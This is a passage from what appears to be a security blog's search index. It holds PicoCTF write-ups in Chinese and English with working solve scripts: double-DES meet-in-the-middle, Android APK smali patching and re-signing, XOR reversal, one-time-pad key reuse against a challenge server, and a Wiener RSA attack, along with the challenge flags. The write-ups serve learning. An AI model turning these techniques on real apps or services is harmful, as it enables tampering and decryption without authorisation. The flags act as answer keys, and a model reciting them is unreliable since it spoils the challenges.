binascii.unhexlify(input(\u0026#34;What data would you like to encrypt? \u0026#34;).rstrip()).decode() except: res = None return res def double_encrypt(m): msg = pad(m) cipher1 = DES.new(KEY1, DES.MODE_ECB) enc_msg = cipher1.encrypt(msg) cipher2 = DES.new(KEY2, DES.MODE_ECB) return binascii.hexlify(cipher2.encrypt(enc_msg)).decode() print(\u0026#34;Here is the flag:\u0026#34;) print(double_encrypt(FLAG)) while True: inputs = get_input() if inputs: print(double_encrypt(inputs)) else: print(\u0026#34;Invalid input.\u0026#34;) :::\nRecon # The keyspace is small($10^6$), so we can put the encryption plaintext in a dictionary. The complexity is $O(2*10^6)$.\nExploit # from pwn import * from tqdm import tqdm import ddes from Crypto.Cipher import DES from itertools import product message = ddes.pad(binascii.unhexlify(\u0026#39;00\u0026#39;).decode()) enc_message = bytes.fromhex(\u0026#34;6ee2234a9e61e816\u0026#34;) flag = bytes.fromhex(\u0026#34;0446d14e0b7dbd6202a704e86d05747382cc26567449bbebb3ab76f42ce8be4957c2731923859baf\u0026#34;) my_dict = {} for i in tqdm(product(string.digits, repeat=6), total=10 ** 6): key1 = ddes.pad(\u0026#34;\u0026#34;.join(i)) cipher1 = DES.new(key1, DES.MODE_ECB) enc_msg1 = cipher1.encrypt(message) my_dict[enc_msg1] = key1 for j in tqdm(product(string.digits, repeat=6), total=10 ** 6): key2 = ddes.pad(\u0026#34;\u0026#34;.join(j)) cipher2 = DES.new(key2, DES.MODE_ECB) dec_msg2 = cipher2.decrypt(enc_message) if dec_msg2 in my_dict: cipher1 = DES.new(my_dict[dec_msg2], DES.MODE_ECB) print(\u0026#34;flag = \u0026#34;, bytes.fromhex(cipher1.decrypt(cipher2.decrypt(flag)).hex()).decode(\u0026#39;cp437\u0026#39;)) Reference # maple3142 - Double DES\n"},{"id":251,"href":"/security/practice/picoctf/reverse/picoctf---droids1/","title":"PicoCTF - droids1","section":"Securities","content":" PicoCTF - droids1 # Backgroud # Android App 逆向入門之一：拆開與重組 apk : 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的\nTools # apktool 跟著installation guide就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code Android Studio: 此工具目的在於利用emulator把該軟體安裝後跑起來 JADX: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended) $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip $ unzip jadx-1.1.0.zip -d jadx $ cd jadx $ cd ./bin $ ./jadx-gui Recon # 這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考1的WP\nExploit # ApkTools # $ apktool d one.apk I: Using Apktool 2.8.1 on one.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\\Users\\Bernie\\AppData\\Local\\apktool\\framework\\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... 如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數d代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如： Code會放在./smali/com/hellocmu/picoctf/(PS: 只不過code很醜，畢竟是smali) Strings會放在./res/values/strings.xml\n根據2的教學:\n在我們利用 apktool d 拆開的內容中，有一個資料夾叫做 smali，裡面存放著的就是從 classes.dex 還原出來的東西，也就是程式碼 Smali 是跑在 Android Dalvik VM 上的 byte code，有著自己的一套語法規則，如果想要看到我們熟悉的 Java 程式碼，必須要將 smali 還原成 Java。\nJADX # 其實用jadx也可以直接反編譯，而且還有GUI可以看，不香ㄇ 用JADX一樣可以在相同的地方找到code，只是這一些code已經被還原成java\npackage com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String fenugreek(String str); public static String getFlag(String input, Context ctx) { String password = ctx.getString(R.string.password); return input.equals(password) ? fenugreek(input) : \u0026#34;NOPE\u0026#34;; } } 可以看到FlagstaffHill這個class有兩個member(fenugreek/getFlag)，所以看起來他會把我們輸入的東西和password這個variable做比較，如果一樣就會去call fenugreek(input)，否則回傳NOPE 而password是從R.string.password來的，可以看到password的值是0x7f0b002f應該是一個offset?或是一個地址，不是很確定 反正最後取strings的地方在./Resource/resources.arsc/res/values/strings.xml 然後我們就可以利用Android Studio或是直接在自己的手機安裝這個apk，接著輸入password(opossum)就可以拿到flag了 Flag: picoCTF{pining.for.the.fjords}\nReference # droids1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAndroid App 逆向入門之二：修改 smali 程式碼 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":252,"href":"/security/practice/picoctf/reverse/picoctf---droids3/","title":"PicoCTF - droids3","section":"Securities","content":" PicoCTF - droids3 # Background # Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code # package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cilantro(String str); public static String nope(String input) { return \u0026#34;don\u0026#39;t wanna\u0026#34;; } public static String yep(String input) { return cilantro(input); } public static String getFlag(String input, Context ctx) { String flag = nope(input); return flag; } } Recon # 利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出don't wanna，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程 Apktool decode apk file$\\to$修改必要的地方$\\to$Apktool重新打包$\\to$簽名$\\to$Align$\\to$Done，這一個部分在 Android App 逆向入門之二：修改 smali 程式碼 有詳細的說明\nExploit # 修改smali(./three/smali/com/hellcmu/picoctf/FlagstaffHill.smali) 只要把 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;nope(Ljava/lang/String;)Ljava/lang/String; 修改成 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;yep(Ljava/lang/String;)Ljava/lang/String; 打包並簽名 這個真的找很久，需要align又要先簽名，雖然android studio把簽名的部分整合進去了，但algin的部分也是頗麻煩，所幸透過1的說明，直接使用2這個tool，就可以省掉不少時間，真香 $ apktool b three -o three_new.apk $ wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar $ java -jar uber-apk-signer-1.3.0.jar --apks three_new.apk Android Studio安裝並執行 最後就直接在android studio執行emulator然後灌已經修改過的apk就好了，此時隨便輸入一些東西，就會噴flag Flag: picoCTF{tis.but.a.scratch}\nReference # droids3\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUber Apk Signer\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":253,"href":"/security/practice/picoctf/reverse/picoctf---droids4/","title":"PicoCTF - droids4","section":"Securities","content":" PicoCTF - droids4 # Background # Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code # package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cardamom(String str); public static String getFlag(String input, Context ctx) { StringBuilder ace = new StringBuilder(\u0026#34;aaa\u0026#34;); StringBuilder jack = new StringBuilder(\u0026#34;aaa\u0026#34;); StringBuilder queen = new StringBuilder(\u0026#34;aaa\u0026#34;); StringBuilder king = new StringBuilder(\u0026#34;aaa\u0026#34;); ace.setCharAt(0, (char) (ace.charAt(0) + 4)); ace.setCharAt(1, (char) (ace.charAt(1) + 19)); ace.setCharAt(2, (char) (ace.charAt(2) + 18)); jack.setCharAt(0, (char) (jack.charAt(0) + 7)); jack.setCharAt(1, (char) (jack.charAt(1) + 0)); jack.setCharAt(2, (char) (jack.charAt(2) + 1)); queen.setCharAt(0, (char) (queen.charAt(0) + 0)); queen.setCharAt(1, (char) (queen.charAt(1) + 11)); queen.setCharAt(2, (char) (queen.charAt(2) + 15)); king.setCharAt(0, (char) (king.charAt(0) + 14)); king.setCharAt(1, (char) (king.charAt(1) + 20)); king.setCharAt(2, (char) (king.charAt(2) + 15)); String password = \u0026#34;\u0026#34;.concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()); return input.equals(password) ? \u0026#34;call it\u0026#34; : \u0026#34;NOPE\u0026#34;; } } Recon # 基本上用眼睛看應該看的出來password是啥，不過他最後只會print出call it或是NOPE，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的\nExploit # 前一題的FlagstaffHill和smali package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cilantro(String str); public static String nope(String input) { return \u0026#34;don\u0026#39;t wanna\u0026#34;; } public static String yep(String input) { return cilantro(input); } public static String getFlag(String input, Context ctx) { String flag = nope(input); return flag; } } :::spoiler smali .class public Lcom/hellocmu/picoctf/FlagstaffHill; .super Ljava/lang/Object; .source \u0026#34;FlagstaffHill.java\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 6 invoke-direct {p0}, Ljava/lang/Object;-\u0026gt;\u0026lt;init\u0026gt;()V return-void .end method .method public static native cilantro(Ljava/lang/String;)Ljava/lang/String; .end method .method public static getFlag(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String; .locals 1 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .param p1, \u0026#34;ctx\u0026#34; # Landroid/content/Context; .line 19 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;yep(Ljava/lang/String;)Ljava/lang/String; move-result-object v0 .line 20 .local v0, \u0026#34;flag\u0026#34;:Ljava/lang/String; return-object v0 .end method .method public static nope(Ljava/lang/String;)Ljava/lang/String; .locals 1 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .line 11 const-string v0, \u0026#34;don\\\u0026#39;t wanna\u0026#34; return-object v0 .end method .method public static yep(Ljava/lang/String;)Ljava/lang/String; .locals 1 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .line 15 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;cilantro(Ljava/lang/String;)Ljava/lang/String; move-result-object v0 return-object v0 .end method ::: 所以我們只要像前一題一樣，把input丟到yep然後在call cardamon這個method應該就可以了，所以具體來說就是新增yep這個method .method public static yep(Ljava/lang/String;)Ljava/lang/String; .locals 1 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .line 15 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;cardamom(Ljava/lang/String;)Ljava/lang/String; move-result-object v0 return-object v0 .end method 然後把最後getFlag的return改掉，變成:\n.line 36 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;yep(Ljava/lang/String;)Ljava/lang/String; move-result-object v5 return-object v5 :::spoiler Completely FlagstaffHill.smali\n.class public Lcom/hellocmu/picoctf/FlagstaffHill; .super Ljava/lang/Object; .source \u0026#34;FlagstaffHill.java\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 6 invoke-direct {p0}, Ljava/lang/Object;-\u0026gt;\u0026lt;init\u0026gt;()V return-void .end method .method public static native cardamom(Ljava/lang/String;)Ljava/lang/String; .end method .method public static getFlag(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String; .locals 8 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .param p1, \u0026#34;ctx\u0026#34; # Landroid/content/Context; .line 12 new-instance v0, Ljava/lang/StringBuilder; const-string v1, \u0026#34;aaa\u0026#34; invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;(Ljava/lang/String;)V .line 13 .local v0, \u0026#34;ace\u0026#34;:Ljava/lang/StringBuilder; new-instance v2, Ljava/lang/StringBuilder; invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;(Ljava/lang/String;)V .line 14 .local v2, \u0026#34;jack\u0026#34;:Ljava/lang/StringBuilder; new-instance v3, Ljava/lang/StringBuilder; invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;(Ljava/lang/String;)V .line 15 .local v3, \u0026#34;queen\u0026#34;:Ljava/lang/StringBuilder; new-instance v4, Ljava/lang/StringBuilder; invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;(Ljava/lang/String;)V move-object v1, v4 .line 17 .local v1, \u0026#34;king\u0026#34;:Ljava/lang/StringBuilder; const/4 v4, 0x0 invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v5 add-int/lit8 v5, v5, 0x4 int-to-char v5, v5 invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 18 const/4 v5, 0x1 invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v6 add-int/lit8 v6, v6, 0x13 int-to-char v6, v6 invoke-virtual {v0, v5, v6}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 19 const/4 v6, 0x2 invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/lit8 v7, v7, 0x12 int-to-char v7, v7 invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 21 invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/lit8 v7, v7, 0x7 int-to-char v7, v7 invoke-virtual {v2, v4, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 22 invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/2addr v7, v4 int-to-char v7, v7 invoke-virtual {v2, v5, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 23 invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/2addr v7, v5 int-to-char v7, v7 invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 25 invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/2addr v7, v4 int-to-char v7, v7 invoke-virtual {v3, v4, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 26 invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/lit8 v7, v7, 0xb int-to-char v7, v7 invoke-virtual {v3, v5, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 27 invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/lit8 v7, v7, 0xf int-to-char v7, v7 invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 29 invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v7 add-int/lit8 v7, v7, 0xe int-to-char v7, v7 invoke-virtual {v1, v4, v7}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 30 invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v4 add-int/lit8 v4, v4, 0x14 int-to-char v4, v4 invoke-virtual {v1, v5, v4}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 31 invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;-\u0026gt;charAt(I)C move-result v4 add-int/lit8 v4, v4, 0xf int-to-char v4, v4 invoke-virtual {v1, v6, v4}, Ljava/lang/StringBuilder;-\u0026gt;setCharAt(IC)V .line 33 invoke-virtual {v3}, Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; move-result-object v4 const-string v5, \u0026#34;\u0026#34; invoke-virtual {v5, v4}, Ljava/lang/String;-\u0026gt;concat(Ljava/lang/String;)Ljava/lang/String; move-result-object v4 invoke-virtual {v2}, Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; move-result-object v5 invoke-virtual {v4, v5}, Ljava/lang/String;-\u0026gt;concat(Ljava/lang/String;)Ljava/lang/String; move-result-object v4 .line 34 invoke-virtual {v0}, Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; move-result-object v5 invoke-virtual {v4, v5}, Ljava/lang/String;-\u0026gt;concat(Ljava/lang/String;)Ljava/lang/String; move-result-object v4 invoke-virtual {v1}, Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; move-result-object v5 invoke-virtual {v4, v5}, Ljava/lang/String;-\u0026gt;concat(Ljava/lang/String;)Ljava/lang/String; move-result-object v4 .line 36 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;yep(Ljava/lang/String;)Ljava/lang/String; move-result-object v5 return-object v5 .end method .method public static yep(Ljava/lang/String;)Ljava/lang/String; .locals 1 .param p0, \u0026#34;input\u0026#34; # Ljava/lang/String; .line 15 invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;-\u0026gt;cardamom(Ljava/lang/String;)Ljava/lang/String; move-result-object v0 return-object v0 .end method :::\n在用apktool打包，在簽名和align就可以丟到Android Studio了\n$ apktool b four -o four_new.apk $ java -jar ./uber-apk-signer-1.1.0.jar --apks four_new.apk Flag: picoCTF{not.particularly.silly}\n"},{"id":254,"href":"/security/practice/picoctf/reverse/picoctf---easy-as-gdb/","title":"PicoCTF - Easy as GDB","section":"Securities","content":" PicoCTF - Easy as GDB # Source code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { char *str_len; // eax int v5; // [esp-8h] [ebp-20h] int v6; // [esp-4h] [ebp-1Ch] char *input_flag; // [esp+4h] [ebp-14h] size_t str_len_1; // [esp+8h] [ebp-10h] char *src; // [esp+Ch] [ebp-Ch] input_flag = calloc(0x200u, 1u); printf(\u0026#34;input the flag: \u0026#34;); fgets(input_flag, 512, stdin); str_len = strnlen(aZNh, 512, v5, v6); src = enc_input(str_len, str_len); sub_7C2(src, 1, 1); if ( check_flag(src, str_len_1) == 1 ) puts(\u0026#34;Correct!\u0026#34;); else puts(\u0026#34;Incorrect.\u0026#34;); return 0; } :::\n:::spoiler IDA Main Encryption Part\nchar *__cdecl sub_82B(char *src, size_t enc_flag_len) { unsigned int i; // [esp+0h] [ebp-18h] char *dest; // [esp+Ch] [ebp-Ch] size_t enc_flag_len_and; // [esp+24h] [ebp+Ch] enc_flag_len_and = (enc_flag_len \u0026amp; 0xFFFFFFFC) + 4; dest = malloc(enc_flag_len_and + 1); strncpy(dest, src, enc_flag_len_and); for ( i = 0xABCF00D; i \u0026lt; 0xDEADBEEF; i += 0x1FAB4D ) main_enc_part(dest, enc_flag_len_and, i); return dest; } ::: :::spoiler IDA Main Encryption Part 2\nunsigned int __cdecl sub_6BD(int dest, unsigned int enc_flag_len_and, int idx) { unsigned int result; // eax unsigned int i; // [esp+14h] [ebp-14h] char v5[4]; // [esp+18h] [ebp-10h] unsigned int v6; // [esp+1Ch] [ebp-Ch] v6 = __readgsdword(0x14u); v5[0] = HIBYTE(idx); // 0x0a v5[1] = BYTE2(idx); // 0xbc v5[2] = BYTE1(idx); // 0xf0 v5[3] = idx; // 0x0d for ( i = 0; i \u0026lt; enc_flag_len_and; ++i ) *(dest + i) ^= v5[i \u0026amp; 3]; result = __readgsdword(0x14u) ^ v6; if ( result ) sub_B20(); return result; } :::\nRecon # 這一題算簡單，但搞了好久，一方面是ida有些東西翻的很醜，一方面gdb看不出來main, encryption等等function symbol，所以一些動態的address的提示都沒有，會有點妨礙，但整體來說他做的事情就是他先把index的每一個bytes，都獨立出來，以0x0abcf00d來說， v5[0]=0x0a v5[1]=0xbc v5[2]=0xf0 v5[3]=0x0d 然後跟我們的input的每一個bytes都進行XOR，當第一round結束後new index = 0x0abcf00d + 0x1FAB4D，然後重複前面執行的部分，所以我們要做的事情就只是重複剛剛所有的過程，就可以拿到flag了。 至於要比較的ciphertext可以直接從gdb的動態看出來\nExploit # cipher = bytes.fromhex(\u0026#34;2E6E40681D53657C175816436D5862366F436230016347333F6314636d7a00\u0026#34;) flag = [] for i in range(len(cipher)): flag.append(hex(cipher[i])[2:]) for i in range(0xABCF00D, 0xdea62e4b, 0x1FAB4D): tmp_idx = hex(i)[2:].encode() if len(tmp_idx) \u0026lt; 8: tmp_idx = b\u0026#39;0\u0026#39; + tmp_idx key = [int(tmp_idx[-8:-6], 16), int(tmp_idx[-6:-4], 16), int(tmp_idx[-4:-2], 16), int(tmp_idx[-2:], 16)] for j in range(len(cipher)): tmp = hex(int(flag[j], 16) ^ key[j % 4])[2:] flag[j] = tmp # cipher[j] = bytes.fromhex(hex(cipher[j] ^ key[j % 4])[2:]) print(bytes.fromhex(\u0026#34;\u0026#34;.join(flag)).decode(\u0026#39;cp437\u0026#39;)) "},{"id":255,"href":"/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/","title":"PicoCTF - Easy Peasy","section":"Securities","content":" PicoCTF - Easy Peasy # tags: PicoCTF CTF Crypto # Challenge: Easy Peasy\nBackground # Source code # :::spoiler source code\n#!/usr/bin/python3 -u import os.path KEY_FILE = \u0026#34;key\u0026#34; KEY_LEN = 50000 FLAG_FILE = \u0026#34;flag\u0026#34; def startup(key_location): flag = open(FLAG_FILE).read() kf = open(KEY_FILE, \u0026#34;rb\u0026#34;).read() start = key_location stop = key_location + len(flag) key = kf[start:stop] key_location = stop result = list(map(lambda p, k: \u0026#34;{:02x}\u0026#34;.format(ord(p) ^ k), flag, key)) print(\u0026#34;This is the encrypted flag!\\n{}\\n\u0026#34;.format(\u0026#34;\u0026#34;.join(result))) return key_location def encrypt(key_location): ui = input(\u0026#34;What data would you like to encrypt? \u0026#34;).rstrip() if len(ui) == 0 or len(ui) \u0026gt; KEY_LEN: return -1 start = key_location stop = key_location + len(ui) kf = open(KEY_FILE, \u0026#34;rb\u0026#34;).read() if stop \u0026gt;= KEY_LEN: stop = stop % KEY_LEN key = kf[start:] + kf[:stop] else: key = kf[start:stop] key_location = stop result = list(map(lambda p, k: \u0026#34;{:02x}\u0026#34;.format(ord(p) ^ k), ui, key)) print(\u0026#34;Here ya go!\\n{}\\n\u0026#34;.format(\u0026#34;\u0026#34;.join(result))) return key_location print(\u0026#34;******************Welcome to our OTP implementation!******************\u0026#34;) c = startup(0) while c \u0026gt;= 0: c = encrypt(c) :::\nExploit - Reuse Key # Observe the length of key It\u0026rsquo;s 50000. So, we can reuse it after sending the trash value with length $50000 - len(flag)\\ /\\ 2$\nThen send a given strings with length 32 After sending the trash data, we can reuse the key and though we do not know the flag nor key, we can send something with size 32 that we construct ourselves such as 'a' * 32 The workflow is as below: $flag\\ xor\\ key = A$ ${\u0026lsquo;a\u0026rsquo;*32}\\ xor\\ key = B$ The exploit is $\\to$ $B\\ xor\\ {\u0026lsquo;a\u0026rsquo;*32}=key$ $key\\ xor\\ A=flag$\nSo, the whole expression is $B\\ xor\\ {\u0026lsquo;a\u0026rsquo;*32}\\ xor\\ A=flag$\nThese code aimed to find the cipher flag and cipher 'a'*32\nfrom pwn import * import sys r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 11188) context.arch = \u0026#39;amd64\u0026#39; r.recvline() r.recvline() cipher_flag = r.recvlineS(keepends = False) log.info(f\u0026#34;Cipher flag: {cipher_flag}\u0026#34;) r.recvline() r.sendline(b\u0026#39;a\u0026#39;*(50000 - int(len(cipher_flag) / 2))) r.recvline() r.recvline() r.recvline() r.sendline(b\u0026#39;a\u0026#39; * 32) r.recvline() encrypt_32a = r.recvlineS(keepends = False) log.info(f\u0026#34;Cipher \u0026#39;a\u0026#39; * 32: {encrypt_32a}\u0026#34;) plaintext_32a = \u0026#39;61\u0026#39; * 32 log.info(f\u0026#34;Plaintext \u0026#39;a\u0026#39; * 32: {plaintext_32a}\u0026#34;) r.interactive() Find flag\n$ python \u0026gt;\u0026gt;\u0026gt; a = 0x551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007 \u0026gt;\u0026gt;\u0026gt; b = 0x03463d1959523d1907513d190503163d1903543d1904573d1900003b3d190457 \u0026gt;\u0026gt;\u0026gt; c = 0x6161616161616161616161616161616161616161616161616161616161616161 \u0026gt;\u0026gt;\u0026gt; \u0026#39;{:x}\u0026#39;.format(a^b^c) \u0026#39;3739303466663833306631633562626138663736333730373234376261336531\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(bytes.fromhex(d).decode(\u0026#39;utf-8\u0026#39;)) 7904ff830f1c5bba8f763707247ba3e1 The flag is picoCTF{7904ff830f1c5bba8f763707247ba3e1}\nReference # picoCTF 2021 easypeasy Easy Peasy - write up\n"},{"id":256,"href":"/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/","title":"PicoCTF - Easy Peasy Or Bad Questions","section":"Securities","content":" PicoCTF - Easy Peasy Or Bad Questions # [TOC]\nChallenge: logon🍰 # Exploit - Set cookie # Challenge: where are the robots🍰 # Exploit - robots.txt # Payload: https://jupiter.challenges.picoctf.org/problem/56830/robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html Challenge: Packets Primer🍰 # Exploit - search { string directly # Challenge: Disk, disk, sleuth!🍰 # Exploit - Strings search # $ file dds1-alpine.flag.img.gz dds1-alpine.flag.img.gz: gzip compressed data, was \u0026#34;dds1-alpine.flag.img\u0026#34;, last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728 $ gzip -d dds1-alpine.flag.img.gz $ ls dds1-alpine.flag.img $ strings dds1-alpine.flag.img | grep \u0026#34;pico\u0026#34; ffffffff81399ccf t pirq_pico_get ffffffff81399cee t pirq_pico_set ffffffff820adb46 t pico_router_probe SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0} Challenge: Sleuthkit Apprentice🍰 # Exploit - FTK Imager # Challenge: St3g0🍰 # Exploit - zsteg # Challenge: The Numbers🍰 # Exploit - Alphabetic Sequence # A $\\to$ 1 B $\\to$ 2 \u0026hellip; Z $\\to$ 26 Flag: PICOCTF{THENUMBERSMASNO}\nChallenge: b00tl3gRSA2🍰 # Very similar to Dachshund Attacks\n(5)低解密指數攻擊\nExploit - Large e in RSA # :::spoiler Exploit Script\nimport gmpy2 from Crypto.PublicKey import RSA import ContinuedFractions, Arithmetic from Crypto.Util.number import long_to_bytes def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr \u0026gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(\u0026#34;Hacked!\u0026#34;) return d return False def main(): # n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L # e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L # c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 c = 56811169374970604258879254822752913202698796852666466049062507281296833525794733933911606542222058381462570064389043798511821976201439555996087100908424109130076018300965272821022540600753461592318517243041444023628038886623171367273746266838142957409528381844138653228764240191549418194103631719400458457467 n = 58070026135855523239461918454846975979926839142742523564643445392568377118997543017140325578838063916989981257526294599185581601337665038563515627572917307698324180632146478826058737890134680323581229835600225464118844212164933670376706076943294749341174871787564338433388944984493037567781794408220522036263 e = 36130176628708131522838994566654566009391592426941561879120208879371471770209863345391365424152782310438126184550592620601969503885509400986708473532710919272338089391139828798480407038661283690225490135620650318136420441354969537269806129891673717369657476436221539029150435924295108842265903755215180202497 d = wiener_hack(e, n) m = pow(c, d, n) print(long_to_bytes(m)) if __name__==\u0026#34;__main__\u0026#34;: main() :::\nChallenge: Sum-O-Primes🍰 # Source Code # :::spoiler Source Code\n#!/usr/bin/python from binascii import hexlify from gmpy2 import mpz_urandomb, next_prime, random_state import math import os import sys if sys.version_info \u0026lt; (3, 9): import gmpy2 math.gcd = gmpy2.gcd math.lcm = gmpy2.lcm FLAG = open(\u0026#39;flag.txt\u0026#39;).read().strip() FLAG = int(hexlify(FLAG.encode()), 16) SEED = int(hexlify(os.urandom(32)).decode(), 16) STATE = random_state(SEED) def get_prime(bits): return next_prime(mpz_urandomb(STATE, bits) | (1 \u0026lt;\u0026lt; (bits - 1))) p = get_prime(1024) q = get_prime(1024) x = p + q n = p * q e = 65537 m = math.lcm(p - 1, q - 1) d = pow(e, -1, m) c = pow(FLAG, e, n) print(f\u0026#39;x = {x:x}\u0026#39;) print(f\u0026#39;n = {n:x}\u0026#39;) print(f\u0026#39;c = {c:x}\u0026#39;) :::\nExploit - Easy # 題目給了$x=p+q$，而我們的目標是求出$(p-1)*(q-1)=pq-p-q+1=n-x+1$ :::spoiler 